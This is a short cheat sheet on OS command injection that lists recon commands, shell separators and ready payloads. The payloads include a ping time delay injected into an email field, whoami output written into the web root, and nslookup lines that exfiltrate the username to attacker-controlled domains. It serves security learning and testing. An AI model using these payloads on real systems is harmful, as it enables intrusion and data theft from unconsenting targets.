# Command Injection

## Useful commands <a href="#useful-commands" id="useful-commands"></a>

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

## Ways of injecting OS commands <a href="#ways-of-injecting-os-commands" id="ways-of-injecting-os-commands"></a>

### Linux & Windows

* `&`
* `&&`
* `|`
* `||`

### Linux Only

* `;`
* Newline (`0x0a` or `\n` )

### Inline Command Injection in Linux

`` `command` ``

`$(command)`

## Blind OS command injection with time delays

`email=x||ping+-c+10+127.0.0.1||`

## Exploiting blind OS command injection by redirecting output <a href="#exploiting-blind-os-command-injection-by-redirecting-output" id="exploiting-blind-os-command-injection-by-redirecting-output"></a>

`email=x||whoami > /var/www/images/whoami.txt||`

## Exploiting blind OS command injection using out-of-band (OAST) techniques <a href="#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques" id="exploiting-blind-os-command-injection-using-out-of-band-oast-techniques"></a>

``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``

## Blind OS command injection with out-of-band data exfiltration

``nslookup+`whoami`uvtfzdk1aq8ao8ngoyktge3ea5gx4m.oastify.com``
